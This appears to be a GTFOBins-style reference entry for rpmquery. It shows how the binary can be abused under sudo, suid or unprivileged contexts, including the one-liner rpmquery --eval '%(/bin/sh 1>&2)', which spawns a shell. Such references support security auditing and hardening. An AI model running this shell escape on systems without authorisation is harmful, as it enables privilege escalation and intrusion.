title: rpmquery
html:
rpmquery

Inherit

Context: sudo, suid, unprivileged

rpmquery --eval '%{lua:...}'

Shell

Context: sudo, suid, unprivileged

rpmquery --eval '%(/bin/sh 1>&2)'
